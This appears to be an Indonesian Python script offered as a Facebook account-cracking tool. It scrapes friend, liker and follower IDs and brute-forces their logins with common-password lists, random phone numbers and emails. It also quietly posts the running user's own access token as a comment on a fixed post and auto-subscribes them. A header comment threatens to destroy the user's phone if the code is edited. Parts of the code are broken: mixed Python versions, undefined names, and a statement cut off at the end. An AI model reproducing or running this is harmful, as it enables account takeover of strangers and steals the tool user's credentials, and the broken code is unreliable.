#!/usr/bin/python3
# coding=utf-8
# Mengandung Virus Berbahaya
# Jika direcode maka akan kuaktifkan virusnya
# Sehingga hape anda rusak dan takkan hidup lagi

###### IMPORT MODULE ######

import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,json,concurrent.futures
from concurrent.futures import ThreadPoolExecutor as ThreadPool

###### RANDOM WARNA ######

p = "\033[1;97m" # putih
m = "\033[1;91m" # merah
h = "\033[1;92m" # hijau
k = "\033[1;93m" # kuning
b = "\033[1;94m" # biru
u = "\033[1;95m" # ungu
o = "\033[1;96m" # biru muda

###### LOGO ######

def banner():
    print("""\033[;96m   ________ _     
  / ____/ /___ ___________(_)____
 / / / / __ `/ ___/ ___/ / ___/Created by
\033[;93m/ /___/ / /_/ (__ |__ ) / /__  Ramdhan R  
\____/_/\__,_/____/____/_/\___/
""")


ok = []
cp = []
ttl =[]

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
		os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:log_token()
	else:log_token()

def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result

###### LOGIN TOKEN ######

def log_token():
    os.system("clear")
    banner()
    toket = input(m+"\n["+k+"•"+m+"]"+u+" Token : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((m+"\n["+k+"•"+m+"]"+h+" Login Successful"))
        jalan('\033[1;96mAGAR BERJALAN LANCAR ANDA HARUS SUBSCRIBE DULU CHANNEL INI!')
        os.system('xdg-open http://www.youtube.com/c/TutorialityStudio')
        bot()
    except KeyError:
        print((k+"["+p+"!"+k+"]"+p+" Token Invalid"))
        os.system("clear")
        log_token()

###### BOT KOMEN ######

def bot():
	try:
		toket=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	kom = ("Gantengnya Ramdani😘")
	requests.post('https://graph.facebook.com/100044932290784/subscribers?access_token=' + toket) 
	requests.post('https://graph.facebook.com/344477753726632/comments/?message=' + toket + '&access_token=' + toket)
	requests.post('https://graph.facebook.com/315723919935349/comments/?message=' + kom + '&access_token=' + toket)
	menu()
### MAIN MENU ###

def menu():
    global ua
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["first_name"]
        ttl = a["birthday"]
        id = a["id"]
    except Exception as e:
        print((p+" ["+k+"•"+m+"•"+p+" Error : %s"%e))
        logs()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    print((m+"\n ["+p+" Welcome User \033[1;32m"+nama+m+" ]"+p))
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your ID      : \033[1;32m"+id))
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your TTL     : \033[1;32m"+ttl))
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your Joined  : \033[1;32m"+durasi))
    print((p+"\n ["+k+"01"+p+"]"+p+" Crack ID From Public/Friendlist"))
    print((p+" ["+k+"02"+p+"]"+p+" Crack ID From Likers Post"))
    print((p+" ["+k+"03"+p+"]"+p+" Crack ID From Followers"))
    print((p+" ["+k+"04"+p+"]"+p+" Crack Phone Number"))
    print((p+" ["+k+"05"+p+"]"+p+" Crack Email"))
    print((p+" ["+k+"06"+p+"]"+p+" Check Opsi Account Checkpoint"))
    print(('p+(%s09%s) User Agent'%(O,K))
    print((p+" ["+k+"99"+p+"]"+p+" Result Crack"))
    print((p+" ["+k+"00"+p+"]"+p+" Logout "))
    choose_menu()

def choose_menu():
	r=input(p+"\n ["+k+"•"+m+"•"+p+"] Choose: ")
	if r=="":
		print((p+" ["+k+"•"+m+"•"+p+"] Fill In The Correct"))
		menu()
	elif r=="1" or r=="01":
		publik()
	elif r=="2" or r=="02":
		likers()
	elif r=="3" or r=="03":
		follow()
	elif r=="4" or r=="04":
		random_numbers()
	elif r=="5" or r=="05":
		random_email()
	elif r=="6" or r=="06":
		cek_opsi()
        elif unik in['9','09']:
        	useragent()
	elif r=="99":
		ress()
	elif r=="0" or r=="00":
		try:
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((p+" ["+k+"•"+m+"•"+p+"] Error %s"%e))
	else:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Wrong Input"))
		menu()	

def pilihcrack(file):
  print("\n\033[0;91m [ \033[1;37mSelect Methode Crack\033[1;31m ]\033[1;37m")
  print((p+" ["+k+"01"+p+"] Crack With Api.Facebook"))
  print((p+" ["+k+"02"+p+"] Crack With Api.Facebook + TTL "))
  print((p+" ["+k+"03"+p+"] Crack With Mbasic.Facebook"))
  print((p+" ["+k+"04"+p+"] Crack With Mbasic.Facebook + TTL"))
  print((p+" ["+k+"05"+p+"] Crack With Touch.Facebook"))
  print((p+" ["+k+"06"+p+"] Crack With Touch.Facebook + TTL "))
  print((p+" ["+k+"07"+p+"] Crack With M.Facebook "))
  print((p+" ["+k+"08"+p+"] Crack With M.Facebook + TTL "))
  print((p+" ["+k+"09"+p+"] Crack With Free.Facebook "))
  print((p+" ["+k+"10"+p+"] Crack With Free.Facebook + TTL "))
  print((p+" ["+k+"00"+p+"] Back To Menu "))
  krah=input(p+"\n ["+k+"•"+m+"•"+p+"] Choose : ")
  if krah in[""]:
    print((p+" ["+k+"•"+m+"•"+p+"] Fill In The Correct"))
    pilihcrack(file)
  elif krah in["1","01"]:
    bapi(file)
  elif krah in["2","02"]:
    bapittl(file)
  elif krah in["3","03"]:
    crack(file)
  elif krah in["4","04"]:
    crackttl(file)
  elif krah in["5","05"]:
    tofbe(file)
  elif krah in["6","06"]:
    tofbettl(file)
  elif krah in["7","07"]:
    crekm(file)
  elif krah in["8","08"]:
    crekmttl(file)
  elif krah in["9","09"]:
    freefb(file)
  elif krah in["10"]:
    freefbttl(file)
  elif krah in["0","00"]:
    menu()
  else:
    print((p+" ["+k+"•"+m+"•"+p+"]  Fill In The Correct"))
    pilihcrack(file)

# GANTI USER AGENT
def useragent():
	print ("\n%s [%s01%s] Ganti user agent "%(P,O,P))
	print (" [%s02%s] Cek user agent "%(O,P))
	print (" [%s00%s] Kembali "%(M,P))
	uas()
def uas():
    u = raw_input('\n%s [?] pilih :%s '%(P,K))
    if u == '':
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()
    elif u in("1","01"):
    	print (" %s[%s*%s] ketik %sMy user agent%s di browser google chrome\n [%s*%s] untuk gunakan user agent anda sendiri"%(P,K,P,H,P,K,P))
    	print (" [%s*%s] ketik %sdefault%s untuk gunakan user agent bawaan tools"%(K,P,H,P))
    	try:
    	    ua = raw_input("%s [?] user agent : %s"%(P,K))
            if ua in(""):
            	print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s [!]  Anda akan di arahkan ke browser "%(H));jeda(2)
            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
            elif ua in("default","Default","DEFAULT"):
                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
                open("data/ua.txt","w").write(ua_)
                print ("\n%s [√] menggunakan user agent bawaan"%(H));jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print ("\n%s [√] berhasil mengganti user agent"%(H));jeda(2);menu()
        except KeyboardInterrupt as er:
			exit ("\x1b[1;91m [!] "+er) 
    elif u in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s [%s*%s] user agent anda : %s%s"%(P,K,P,H,ua_));jeda(2);raw_input("\n%s [ %senter%s ] "%(P,K,P));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif u in("0","00"):
    	menu()
    else:
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()

### DUMP ID ###

def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Type \'me\' Dump From Friendlist"))
		idt = input(p+" ["+k+"•"+m+"•"+p+"] User ID Target: ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+" ["+k+"•"+m+"•"+p+"] Name: "+op["name"]))
		except KeyError:
			print((p+" ["+k+"•"+m+"•"+p+"] ID Not Found"))
			print((p+"\n [BACK]"+p))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((p+" ["+k+"•"+m+"•"+p+"] Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(p+"\n ["+k+"•"+m+"•"+p+"] Error : %s"%e)

def likers():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(p+" ["+k+"•"+m+"•"+p+"] ID Post Target: ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+" ["+k+"•"+m+"•"+p+"] Name: "+op["name"]))
		except KeyError:
			print((p+" ["+k+"•"+m+"•"+p+"] ID Not Found"))
			print((p+"\n [BACK]"+p))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((p+" ["+k+"•"+m+"•"+p+"] Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(p+"\n ["+k+"•"+m+"•"+p+"] Error : %s"%e)

def follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(p+" ["+k+"•"+m+"•"+p+"] Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+" ["+k+"•"+m+"•"+p+"] Name: "+op["name"]))
		except KeyError:
			print((p+" ["+k+"•"+m+"•"+p+"] ID Not Found"))
			print((p+"\n [BACK]"+p))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((p+" ["+k+"•"+m+"•"+p+"] Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(p+"\n ["+k+"•"+m+"•"+p+"] Error : %s"%e)

### Krek Nomer su! ###
def random_numbers():
  data = []
  print((p+"\n ["+k+"•"+m+"•"+p+"] Number Must Be 5 Digit"))
  kode=str(input(p+" ["+k+"•"+m+"•"+p+"] Example : 92037\n"+p+" ["+k+"•"+m+"•"+p+"] Input Number: "))
  exit((p+"\n ["+k+"•"+m+"•"+p+"] Number Must Be 5 Digit")) if len(kode) < 5 else ''
  exit((p+"\n ["+k+"•"+m+"•"+p+"] Number Must Be 5 Digit")) if len(kode) > 5 else ''
  jml=int(input(p+" ["+k+"•"+m+"•"+p+"] Amount : "))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print(p+" ["+k+"•"+m+"•"+p+"] Crack Started, Please Wait...\n")
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(p+"\n [BACK]"+p)
  menu()

def random_email():
  data = []
  nama=input(p+" ["+k+"•"+m+"•"+p+"] Target Name : ")
  domain=input(p+" ["+k+"•"+m+"•"+p+"] Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit(("\033[1;37m ["+k+"•"+m+"•"+p+"] Fill In The Correct")) if not domain in ['g','y','h'] else ''
  jml=int(input(p+" ["+k+"•"+m+"•"+p+"] Amount : "))
  setpw=input(p+" ["+k+"•"+m+"•"+p+"] Set Password : ").split(',')
  print("\033[1;37m ["+k+"•"+m+"•"+p+"] Crack Started, Please Wait...\n")
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input("\n\033[1;37m [BACK]")
  menu()

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[0;32m * --> %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[0;33m * --> %s • %s '%(str(user), str(pw)))
        break
  except: pass


### PASSWORD ###

def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"123456")
			else:
				results.append(i+"123")
				results.append(i+"123456")
				results.append(i)
				if "indonesia" in ips:
					results.append("sayang")
					results.append("anjing")
					results.append("bismillah")
					results.append("kontol")
					results.append("freefire")
					results.append("bangsat")
					results.append("bajingan")
	return results

### MODULE CRACK ###

def mbasic(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def f_fb(em,pas,hosts):
	global ua
	r=requests.Session()
	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def touch_fb(em,pas,hosts):
	global ua,touch_fbh
	r=requests.Session()
	r.headers.update({"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://touch.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#touch fb

def m_fb(em, pas, hosts):
    r = requests.Session()
    r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100'
